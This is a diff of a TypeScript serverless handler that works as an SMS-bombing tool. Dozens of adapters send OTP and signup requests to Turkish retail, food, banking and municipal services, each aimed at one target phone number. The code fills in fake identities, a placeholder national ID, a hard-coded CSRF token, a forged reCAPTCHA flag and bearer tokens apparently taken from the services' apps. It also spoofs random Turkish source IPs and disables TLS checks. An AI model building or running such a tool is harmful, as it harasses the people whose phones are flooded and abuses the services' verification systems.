@@ -7,7 +7,7 @@ process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
 // ─── TYPES ──────────────────────────────────────────────────────────────────
 
 export interface NotificationRequest {
-  recipient: string;        // Telefon numarası
+  recipient: string;
   serviceId: string;
   email?: string;
   metadata?: Record<string, unknown>;
@@ -81,116 +81,19 @@ const generateRandomEmail = () => {
   return result + '@gmail.com';
 };
 
-const generateTC = () => {
-  const rakam = [];
-  rakam.push(Math.floor(Math.random() * 9) + 1);
-  for (let i = 1; i < 9; i++) {
-    rakam.push(Math.floor(Math.random() * 10));
-  }
-  rakam.push(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10);
-  rakam.push((rakam[0] + rakam[1] + rakam[2] + rakam[3] + rakam[4] + rakam[5] + rakam[6] + rakam[7] + rakam[8] + rakam[9]) % 10);
-  return rakam.join('');
-};
-
-// ─── SERVICE ADAPTERS ─────────────────────────────────────────────────────────
+// ─── ÇALIŞAN SERVİS ADAPTERLERİ ───────────────────────────────────────────────
 
 class KahveDunyasiAdapter implements ProviderAdapter {
   readonly name = "kahve_dunyasi";
   transform(req: NotificationRequest) {
     return {
-      body: { countryCode: "90", phoneNumber: req.recipient.slice(-10) },
+      body: { countryCode: "90", phoneNumber: req.recipient },
       headers: {
         "X-Client-Platform": "web",
         "X-Language-Id": "tr-TR",
         "Origin": "https://www.kahvedunyasi.com",
         "Referer": "https://www.kahvedunyasi.com/"
       }
-    };
-  }
-}
-
-class KotonAdapter implements ProviderAdapter {
-  readonly name = "koton";
-  transform(req: NotificationRequest) {
-    const email = req.email || generateRandomEmail();
-    return {
-      body: {
-        mobile: req.recipient,
-        firstName: "Memati",
-        lastName: "Bas",
-        email: email,
-        password: "Test123!Test"
-      },
-      headers: { "Origin": "https://www.koton.com" }
-    };
-  }
-}
-
-class PentiAdapter implements ProviderAdapter {
-  readonly name = "penti";
-  transform(req: NotificationRequest) {
-    return {
-      body: { phone: req.recipient },
-      headers: {}
-    };
-  }
-}
-
-class EnglishHomeAdapter implements ProviderAdapter {
-  readonly name = "english_home";
-  transform(req: NotificationRequest) {
-    return {
-      body: { Phone: req.recipient, XID: "" },
-      headers: {
-        "Origin": "https://www.englishhome.com",
-        "Referer": "https://www.englishhome.com/"
-      }
-    };
-  }
-}
-
-class MigrosAdapter implements ProviderAdapter {
-  readonly name = "migros";
-  transform(req: NotificationRequest) {
-    const email = req.email || generateRandomEmail();
-    return {
-      body: { email: email, phoneNumber: req.recipient },
-      headers: {
-        "X-Device-Platform": "IOS",
-        "X-Device-App-Version": "10.6.13",
-        "X-Device-Type": "MOBILE",
-        "X-Device-Language": "tr-TR"
-      }
-    };
-  }
-}
-
-class FileMarketAdapter implements ProviderAdapter {
-  readonly name = "file_market";
-  transform(req: NotificationRequest) {
-    return {
-      body: { mobilePhoneNumber: `90${req.recipient.slice(-10)}` },
-      headers: { "X-Os": "IOS", "X-Version": "1.7" }
-    };
-  }
-}
-
-class BimAdapter implements ProviderAdapter {
-  readonly name = "bim";
-  transform(req: NotificationRequest) {
-    return {
-      body: { phone: req.recipient },
-      headers: {}
-    };
-  }
-}
-
-class MetroMarketAdapter implements ProviderAdapter {
-  readonly name = "metro_market";
-  transform(req: NotificationRequest) {
-    return {
-      body: { methodType: "2", mobilePhoneNumber: `+90${req.recipient.slice(-10)}` },
-      headers: { "Applicationplatform": "2", "Applicationversion": "2.1.1" }
     };
   }
 }
@@ -205,11 +108,11 @@ class WmfAdapter implements ProviderAdapter {
         date_of_birth: "1990-01-01",
         email: email,
         email_allowed: "true",
-        first_name: "Memati",
+        first_name: "Test",
         gender: "male",
-        last_name: "Bas",
+        last_name: "User",
         password: "Test123!Test",
-        phone: `0${req.recipient.slice(-10)}`
+        phone: `0${req.recipient}`
       },
       headers: { "Content-Type": "application/x-www-form-urlencoded" }
     };
@@ -221,210 +124,51 @@ class EvideaAdapter implements ProviderAdapter {
   transform(req: NotificationRequest) {
     const email = req.email || generateRandomEmail();
     const boundary = "----WebKitFormBoundary" + Math.random().toString(36).substring(2);
-    const data = `--${boundary}\r\nContent-Disposition: form-data; name="first_name"\r\n\r\nMemati\r\n` +
-      `--${boundary}\r\nContent-Disposition: form-data; name="last_name"\r\n\r\nBas\r\n` +
+    const data = `--${boundary}\r\nContent-Disposition: form-data; name="first_name"\r\n\r\nTest\r\n` +
+      `--${boundary}\r\nContent-Disposition: form-data; name="last_name"\r\n\r\nUser\r\n` +
       `--${boundary}\r\nContent-Disposition: form-data; name="email"\r\n\r\n${email}\r\n` +
-      `--${boundary}\r\nContent-Disposition: form-data; name="phone"\r\n\r\n0${req.recipient.slice(-10)}\r\n` +
+      `--${boundary}\r\nContent-Disposition: form-data; name="phone"\r\n\r\n0${req.recipient}\r\n` +
       `--${boundary}\r\nContent-Disposition: form-data; name="password"\r\n\r\nTest123!\r\n` +
       `--${boundary}\r\nContent-Disposition: form-data; name="confirm"\r\n\r\ntrue\r\n` +
       `--${boundary}--`;
     return {
       body: data,
-      headers: { "Content-Type": `multipart/form-data; boundary=${boundary}` }
+      headers: { 
+        "Content-Type": `multipart/form-data; boundary=${boundary}`,
+        "X-Project-Name": "undefined",
+        "X-App-Type": "akinon-mobile",
+        "X-Requested-With": "XMLHttpRequest",
+        "X-App-Device": "ios",
+        "Referer": "https://www.evidea.com/"
+      }
     };
   }
 }
 
-class TiklaGelsinAdapter implements ProviderAdapter {
-  readonly name = "tikla_gelsin";
-  transform(req: NotificationRequest) {
-    return {
-      body: {
-        query: `mutation { sendOtpSms(phone: "${req.recipient.slice(-10)}") { resultStatus message } }`
-      },
-      headers: { "Origin": "https://www.tiklagelsin.com" }
-    };
-  }
-}
-
-class StarbucksAdapter implements ProviderAdapter {
-  readonly name = "starbucks";
-  transform(req: NotificationRequest) {
-    const email = req.email || generateRandomEmail();
-    return {
-      body: {
-        allowEmail: true,
-        allowSms: true,
-        deviceId: "31",
-        email: email,
-        firstName: "Memati",
-        lastName: "Bas",
-        password: "Test123!Test",
-        phoneNumber: req.recipient,
-        preferredName: "Memati"
-      },
-      headers: { "Operationchannel": "ios" }
-    };
-  }
-}
-
-class DominosAdapter implements ProviderAdapter {
-  readonly name = "dominos";
-  transform(req: NotificationRequest) {
-    const email = req.email || generateRandomEmail();
-    return {
-      body: { mobilePhone: req.recipient.slice(-10), isSure: false, email: email },
-      headers: { "Appversion": "IOS-7.1.0", "Servicetype": "CarryOut" }
-    };
-  }
-}
-
-class LittleCaesarsAdapter implements ProviderAdapter {
-  readonly name = "little_caesars";
-  transform(req: NotificationRequest) {
-    return {
-      body: { Phone: `0${req.recipient.slice(-10)}`, NameSurname: "Memati Bas" },
-      headers: { "X-Platform": "ios", "X-Version": "1.0.0" }
-    };
-  }
-}
-
-class BaydonerAdapter implements ProviderAdapter {
-  readonly name = "baydoner";
-  transform(req: NotificationRequest) {
-    const email = req.email || generateRandomEmail();
-    return {
-      body: {
-        AppVersion: "1.3.2",
-        AreaCode: 90,
-        City: "İSTANBUL",
-        CityId: 34,
-        DeviceId: "31s",
-        Email: email,
-        GDPRPolicy: false,
-        Gender: "Erkek",
-        GenderId: 1,
-        Name: "Memati",
-        PhoneNumber: req.recipient,
-        Platform: 1,
-        Surname: "Bas",
-        TermsAndConditions: false
-      },
-      headers: { "Platform": "1" }
-    };
-  }
-}
-
-class KofteciYusufAdapter implements ProviderAdapter {
-  readonly name = "kofteci_yusuf";
-  transform(req: NotificationRequest) {
-    return {
-      body: { Telefon: req.recipient },
-      headers: {}
-    };
-  }
-}
-
-class KomageneAdapter implements ProviderAdapter {
-  readonly name = "komagene";
-  transform(req: NotificationRequest) {
-    return {
-      body: { Telefon: req.recipient, FirmaId: "32" },
-      headers: {}
-    };
-  }
-}
-
-class CoffyAdapter implements ProviderAdapter {
-  readonly name = "coffy";
-  transform(req: NotificationRequest) {
-    return {
-      body: { phoneNumber: req.recipient },
-      headers: {}
-    };
-  }
-}
-
-class MartiAdapter implements ProviderAdapter {
-  readonly name = "marti";
-  transform(req: NotificationRequest) {
-    return {
-      body: { mobile_number: req.recipient },
-      headers: {}
-    };
-  }
-}
-
-class IDOAdapter implements ProviderAdapter {
-  readonly name = "ido";
+class DrAdapter implements ProviderAdapter {
+  readonly name = "dr";
   transform(req: NotificationRequest) {
     return {
       body: { phone: req.recipient },
-      headers: {}
+      headers: {
+        "Content-Type": "application/json",
+        "Origin": "https://www.dr.com.tr",
+        "Referer": "https://www.dr.com.tr/"
+      }
     };
   }
 }
 
-class KimGbIsterAdapter implements ProviderAdapter {
-  readonly name = "kim_gb_ister";
+class FileMarketAdapter implements ProviderAdapter {
+  readonly name = "file_market";
   transform(req: NotificationRequest) {
     return {
-      body: { msisdn: `90${req.recipient.slice(-10)}` },
-      headers: {}
-    };
-  }
-}
-
-class Dijital345Adapter implements ProviderAdapter {
-  readonly name = "345_dijital";
-  transform(req: NotificationRequest) {
-    return {
-      body: { phoneNumber: `+90${req.recipient.slice(-10)}` },
-      headers: {}
-    };
-  }
-}
-
-class BeefullAdapter implements ProviderAdapter {
-  readonly name = "beefull";
-  transform(req: NotificationRequest) {
-    return {
-      body: {
-        phoneCode: "90",
-        phoneNumber: req.recipient.slice(-10),
-        tenant: "beefull"
-      },
-      headers: {}
-    };
-  }
-}
-
-class NaosstarsAdapter implements ProviderAdapter {
-  readonly name = "naosstars";
-  transform(req: NotificationRequest) {
-    return {
-      body: { telephone: `+90${req.recipient.slice(-10)}` },
-      headers: {}
-    };
-  }
-}
-
-class AkasyaAvmAdapter implements ProviderAdapter {
-  readonly name = "akasya_avm";
-  transform(req: NotificationRequest) {
-    return {
-      body: { phone: req.recipient },
-      headers: { "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5" }
-    };
-  }
-}
-
-class AkbatiAdapter implements ProviderAdapter {
-  readonly name = "akbati";
-  transform(req: NotificationRequest) {
-    return {
-      body: { phone: req.recipient },
-      headers: { "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3" }
+      body: { mobilePhoneNumber: `90${req.recipient}` },
+      headers: { 
+        "Content-Type": "application/json",
+        "X-Os": "IOS",
+        "X-Version": "1.7"
+      }
     };
   }
 }
@@ -441,13 +185,14 @@ class YappAdapter implements ProviderAdapter {
         device_type: "I",
         device_version: "15.7.8",
         email: email,
-        firstname: "Memati",
+        firstname: "Test",
         is_allow_to_communication: "1",
         language_id: "1",
-        lastname: "Bas",
-        phone_number: req.recipient
+        lastname: "User",
+        phone_number: req.recipient,
+        sms_code: ""
       },
-      headers: {}
+      headers: { "Content-Type": "application/json" }
     };
   }
 }
@@ -459,13 +204,14 @@ class SuisteAdapter implements ProviderAdapter {
       body: {
         action: "register",
         device_id: "2390ED28-075E-465A-96DA-DFE8F84EB330",
-        full_name: "Memati Bas",
+        full_name: "Test User",
         gsm: req.recipient,
         is_advertisement: "1",
         is_contract: "1",
         password: "Test123!"
       },
       headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
         "X-Mobillium-Device-Brand": "Apple",
         "X-Mobillium-Os-Type": "iOS"
       }
@@ -473,103 +219,88 @@ class SuisteAdapter implements ProviderAdapter {
   }
 }
 
-class PortyAdapter implements ProviderAdapter {
-  readonly name = "porty";
+class FatihBelediyeAdapter implements ProviderAdapter {
+  readonly name = "fatih_belediye";
   transform(req: NotificationRequest) {
+    const email = req.email || generateRandomEmail();
+    const boundary = "----WebKitFormBoundary" + Math.random().toString(36).substring(2);
+    const body = `--${boundary}\r\n` +
+      `Content-Disposition: form-data; name="__RequestVerificationToken"\r\n\r\nGKrki1TGUGJ0CBwKd4n5iRulER91aTo-44_PJdfM4_nxAK7aL1f0Ho9UuqG5lya_8RVBGD-j-tNjE93pZnW8RlRyrAEi6ry6uy8SEC20OPY1\r\n` +
+      `--${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.TCKimlikNo"\r\n\r\n12345678901\r\n` +
+      `--${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.DogumTarihi"\r\n\r\n01.01.1990\r\n` +
+      `--${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.Ad"\r\n\r\nTest\r\n` +
+      `--${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.Soyad"\r\n\r\nUser\r\n` +
+      `--${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.CepTelefonu"\r\n\r\n${req.recipient}\r\n` +
+      `--${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.EPosta"\r\n\r\n${email}\r\n` +
+      `--${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.Sifre"\r\n\r\nTest123!\r\n` +
+      `--${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.SifreyiDogrula"\r\n\r\nTest123!\r\n` +
+      `--${boundary}\r\nContent-Disposition: form-data; name="recaptchaValid"\r\n\r\ntrue\r\n` +
+      `--${boundary}--`;
+    
     return {
-      body: { phone: req.recipient },
-      headers: { "Token": "q2zS6kX7WYFRwVYAr" }
-    };
-  }
-}
-
-class CineverseAdapter implements ProviderAdapter {
-  readonly name = "cineverse";
-  transform(req: NotificationRequest) {
-    return {
-      body: { mobile: req.recipient },
-      headers: {}
-    };
-  }
-}
-
-class MoneyAdapter implements ProviderAdapter {
-  readonly name = "money";
-  transform(req: NotificationRequest) {
-    const formatted = `${req.recipient.slice(0, 3)} ${req.recipient.slice(3, 6)} ${req.recipient.slice(6, 10)}`;
-    return {
-      body: { phone: formatted, GRecaptchaResponse: "" },
-      headers: {
-        "X-Requested-With": "XMLHttpRequest",
-        "Origin": "https://www.money.com.tr"
+      body: body,
+      headers: { 
+        "Content-Type": `multipart/form-data; boundary=${boundary}`,
+        "Origin": "https://ebelediye.fatih.bel.tr",
+        "Referer": "https://ebelediye.fatih.bel.tr/Sicil/KisiUyelikKaydet"
       }
     };
   }
 }
 
-class HayatsuAdapter implements ProviderAdapter {
+// FİNANS SERVİSLERİ
+class BkmExpressAdapter implements ProviderAdapter {
+  readonly name = "bkm_express";
+  transform(req: NotificationRequest) {
+    return {
+      body: { phone: `90${req.recipient}` },
+      headers: {
+        "Content-Type": "application/json",
+        "Origin": "https://www.bkmexpress.com.tr",
+        "Referer": "https://www.bkmexpress.com.tr/"
+      }
+    };
+  }
+}
+
+class ShopAndFlyAdapter implements ProviderAdapter {
+  readonly name = "shopandfly";
+  transform(req: NotificationRequest) {
+    return {
+      body: { phone: `90${req.recipient}` },
+      headers: {
+        "Content-Type": "application/json",
+        "Origin": "https://www.shopandfly.com.tr",
+        "Referer": "https://www.shopandfly.com.tr/"
+      }
+    };
+  }
+}
+
+class TebAdapter implements ProviderAdapter {
+  readonly name = "teb";
+  transform(req: NotificationRequest) {
+    return {
+      body: { phone: `90${req.recipient}` },
+      headers: {
+        "Content-Type": "application/json",
+        "Origin": "https://www.teb.com.tr",
+        "Referer": "https://www.teb.com.tr/"
+      }
+    };
+  }
+}
+
+// LİMİTLİ SERVİSLER
+class HayatSuAdapter implements ProviderAdapter {
   readonly name = "hayat_su";
   transform(req: NotificationRequest) {
     return {
       body: { mobilePhoneNumber: req.recipient, actionType: "register" },
       headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
         "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM"
       }
-    };
-  }
-}
-
-class JokerAdapter implements ProviderAdapter {
-  readonly name = "joker";
-  transform(req: NotificationRequest) {
-    const email = req.email || generateRandomEmail();
-    return {
-      body: {
-        firstName: "Memati",
-        gender: "m",
-        iosVersion: "4.0.2",
-        lastName: "Bas",
-        os: "IOS",
-        password: "Test123!Test",
-        phoneNumber: `0${req.recipient.slice(-10)}`,
-        username: email
-      },
-      headers: {
-        "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE2OTA3MTY1MjEsImV4cCI6MTY5NTkwMDUyMSwidXNlcm5hbWUiOiJHVUVTVDE2OTA3MTY1MjEzMzA3MzdAam9rZXIuY29tLnRyIiwiZ3Vlc3QiOnRydWV9.TaQA8ZDtmU09eFqOFATS8ubXM4BHPQL_BcgeEoqZfuNZcfjfL_xzqRO7fZehzWzEdjHXNXeCUTdjx76EyVB-b3TFuL3OahmrbeaOICD8MXchhMDv78TFhWzOJ9Ad-Mma6QPScSSVL0pYoQHWRhzaeOkmVeypqYiQKGmOEk9NzfOVxDYPa25iJmetiab1Z_b95Hqt5Cls52V7g4pGWmbjYB3gyeUQn5II6neKN174txp1yaGdrNPYwAk_aRJzoAMA1SisZm4rhjdE_9MeyGwjbgk2obPxEVcwvPPwkd56_a34aDOeo6rAvngGALBPWlS89nfHFb6PU2fKyK7jTaVlC0DiVnojlkC_KzoHcptM7SjQBym4Bn9CXZ4kj2J1Om-dhDymQynSCfmQ3JZQd7n1YdQYYMuAoTbjghZhyPu2SCtlI7ao6JhUUcmtO3fjIiyYgAdgD-FDcqSGAs9i5fn3kCidSku5M4ljq1ovJM4BeaNeQdFXqE_WqurpOeLA95fNumGCoXvJGlLhS5VzMdFT-l3cfdPt0V0WmtjJDRpTnosjgfizx4F5qftlVuF98uoFoexg7lQYHyZ-j455-d5B24_WfU8GCjQhtlDVtSTcMiRvUKEjJ-Glm5syv5VVbR7mJxu64SB2J2dPbHcIk6BQuFYXIJklN7GXxDa8mSnEZds"
-      }
-    };
-  }
-}
-
-class HappyAdapter implements ProviderAdapter {
-  readonly name = "happy";
-  transform(req: NotificationRequest) {
-    return {
-      body: { telephone: req.recipient },
-      headers: {
-        "X-Requested-With": "XMLHttpRequest",
-        "Origin": "https://www.happy.com.tr"
-      }
-    };
-  }
-}
-
-class UysalMarketAdapter implements ProviderAdapter {
-  readonly name = "uysal_market";
-  transform(req: NotificationRequest) {
-    return {
-      body: { phone_number: req.recipient },
-      headers: {}
-    };
-  }
-}
-
-class KuryemGelsinAdapter implements ProviderAdapter {
-  readonly name = "kuryem_gelsin";
-  transform(req: NotificationRequest) {
-    return {
-      body: { phoneNumber: req.recipient, phone_country_code: "+90" },
-      headers: {}
     };
   }
 }
@@ -578,124 +309,22 @@ class QumparaAdapter implements ProviderAdapter {
   readonly name = "qumpara";
   transform(req: NotificationRequest) {
     return {
-      body: { msisdn: `+90${req.recipient.slice(-10)}` },
-      headers: {}
+      body: { msisdn: `+90${req.recipient}` },
+      headers: { "Content-Type": "application/json" }
     };
   }
 }
 
-class PaybolAdapter implements ProviderAdapter {
-  readonly name = "paybol";
-  transform(req: NotificationRequest) {
-    return {
-      body: { phone_number: `90${req.recipient.slice(-10)}` },
-      headers: {}
-    };
-  }
-}
-
-class YuffiAdapter implements ProviderAdapter {
-  readonly name = "yuffi";
-  transform(req: NotificationRequest) {
-    return {
-      body: { phone: req.recipient, kvkk: true },
-      headers: {}
-    };
-  }
-}
-
-class HizlieczaAdapter implements ProviderAdapter {
-  readonly name = "hizliecza";
-  transform(req: NotificationRequest) {
-    return {
-      body: { otpOperationType: 2, phoneNumber: `+90${req.recipient.slice(-10)}` },
-      headers: { "Authorization": "Bearer null" }
-    };
-  }
-}
-
-class IpragazAdapter implements ProviderAdapter {
-  readonly name = "ipragaz";
+class BeefullAdapter implements ProviderAdapter {
+  readonly name = "beefull";
   transform(req: NotificationRequest) {
     return {
       body: {
-        birthDate: "01/01/1990",
-        carPlate: "34 ABC 34",
-        mobileOtp: "",
-        name: "Memati Bas",
-        otp: "",
+        phoneCode: "90",
         phoneNumber: req.recipient,
-        playerId: ""
+        tenant: "beefull"
       },
-      headers: {
-        "App-Version": "1.3.9",
-        "App-Name": "ipragaz-mobile",
-        "Os": "ios"
-      }
-    };
-  }
-}
-
-class HamidiyeAdapter implements ProviderAdapter {
-  readonly name = "hamidiye";
-  transform(req: NotificationRequest) {
-    return {
-      body: { phone: req.recipient, isGuest: false },
-      headers: { "Origin": "com.hamidiyeapp" }
-    };
-  }
-}
-
-class ClickmeLiveAdapter implements ProviderAdapter {
-  readonly name = "clickme_live";
-  transform(req: NotificationRequest) {
-    return {
-      body: { phone: req.recipient },
-      headers: {
-        "Authorization": "apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc",
-        "Client-Version": "1.4.0",
-        "Client-Device": "IOS"
-      }
-    };
-  }
-}
-
-class IstegelsinAdapter implements ProviderAdapter {
-  readonly name = "istegelsin";
-  transform(req: NotificationRequest) {
-    return {
-      body: { phone: req.recipient },
-      headers: {}
-    };
-  }
-}
-
-class PidemAdapter implements ProviderAdapter {
-  readonly name = "pidem";
-  transform(req: NotificationRequest) {
-    return {
-      body: { phone: req.recipient.slice(-10) },
-      headers: {}
-    };
-  }
-}
-
-class TasimacimAdapter implements ProviderAdapter {
-  readonly name = "tasimacim";
-  transform(req: NotificationRequest) {
-    return {
-      body: { phone: req.recipient },
-      headers: {}
-    };
-  }
-}
-
-class HeyScooterAdapter implements ProviderAdapter {
-  readonly name = "hey_scooter";
-  transform(req: NotificationRequest) {
-    return {
-      body: { phone: req.recipient },
-      headers: {}
+      headers: { "Content-Type": "application/json" }
     };
   }
 }
@@ -704,55 +333,20 @@ class HeyScooterAdapter implements ProviderAdapter {
 
 const adapters: Record<string, ProviderAdapter> = {
   kahve_dunyasi: new KahveDunyasiAdapter(),
-  koton: new KotonAdapter(),
-  penti: new PentiAdapter(),
-  english_home: new EnglishHomeAdapter(),
-  migros: new MigrosAdapter(),
-  file_market: new FileMarketAdapter(),
-  bim: new BimAdapter(),
-  metro_market: new MetroMarketAdapter(),
   wmf: new WmfAdapter(),
   evidea: new EvideaAdapter(),
-  tikla_gelsin: new TiklaGelsinAdapter(),
-  starbucks: new StarbucksAdapter(),
-  dominos: new DominosAdapter(),
-  little_caesars: new LittleCaesarsAdapter(),
-  baydoner: new BaydonerAdapter(),
-  kofteci_yusuf: new KofteciYusufAdapter(),
-  komagene: new KomageneAdapter(),
-  coffy: new CoffyAdapter(),
-  marti: new MartiAdapter(),
-  ido: new IDOAdapter(),
-  kim_gb_ister: new KimGbIsterAdapter(),
-  "345_dijital": new Dijital345Adapter(),
-  beefull: new BeefullAdapter(),
-  naosstars: new NaosstarsAdapter(),
-  akasya_avm: new AkasyaAvmAdapter(),
-  akbati: new AkbatiAdapter(),
+  dr: new DrAdapter(),
+  file_market: new FileMarketAdapter(),
   yapp: new YappAdapter(),
   suiste: new SuisteAdapter(),
-  porty: new PortyAdapter(),
-  cineverse: new CineverseAdapter(),
-  money: new MoneyAdapter(),
-  hayat_su: new HayatsuAdapter(),
-  joker: new JokerAdapter(),
-  happy: new HappyAdapter(),
-  uysal_market: new UysalMarketAdapter(),
-  kuryem_gelsin: new KuryemGelsinAdapter(),
+  fatih_belediye: new FatihBelediyeAdapter(),
+  bkm_express: new BkmExpressAdapter(),
+  shopandfly: new ShopAndFlyAdapter(),
+  teb: new TebAdapter(),
+  hayat_su: new HayatSuAdapter(),
   qumpara: new QumparaAdapter(),
-  paybol: new PaybolAdapter(),
-  yuffi: new YuffiAdapter(),
-  hizliecza: new HizlieczaAdapter(),
-  ipragaz: new IpragazAdapter(),
-  hamidiye: new HamidiyeAdapter(),
-  vakif_tasdelen: new HamidiyeAdapter(),
-  tasdelen: new HamidiyeAdapter(),
-  clickme_live: new ClickmeLiveAdapter(),
-  istegelsin: new IstegelsinAdapter(),
-  pidem: new PidemAdapter(),
-  tasimacim: new TasimacimAdapter(),
-  hey_scooter: new HeyScooterAdapter(),
-  // Default adapter for unknown services
+  beefull: new BeefullAdapter(),
+  // Default adapter
   default: {
     name: "default",
     transform: (r) => ({ body: { phone: r.recipient }, headers: {} })
@@ -780,7 +374,7 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
       });
     }
 
-    // 1. Circuit Breaker Kontrolü
+    // Circuit Breaker Kontrolü
     if (!breakers.has(serviceId)) breakers.set(serviceId, new CircuitBreaker(serviceId));
     const breaker = breakers.get(serviceId)!;
 
@@ -788,7 +382,7 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
       return res.status(200).json({ ok: false, error: "Circuit OPEN (Cooldown)" });
     }
 
-    // 2. Adapter Dönüşümü
+    // Adapter Dönüşümü
     const adapter = adapters[serviceId] || adapters.default;
     const { body: payload, headers: extraHeaders } = adapter.transform({
       recipient: targetPhone,
@@ -796,12 +390,12 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
       email: body.email
     });
 
-    // 3. Stealth Fetch Execution
+    // Stealth Fetch Execution
     const fakeIP = getRandomTurkishIP();
     const isFormData = extraHeaders['Content-Type']?.includes('multipart/form-data');
     const isFormUrlEncoded = extraHeaders['Content-Type']?.includes('x-www-form-urlencoded');
 
-    let fetchBody: string | FormData;
+    let fetchBody: string;
     let contentType = 'application/json';
 
     if (isFormData) {
@@ -856,7 +450,8 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
       responseData?.Control === 1 ||
       responseData?.code === 50 ||
       responseData?.status === 0 ||
-      responseData?.Durum === true;
+      responseData?.Durum === true ||
+      responseData?.message === 'Telefon numaranıza SMS gönderildi';
 
     if (isSuccess) {
       breaker.onSuccess();
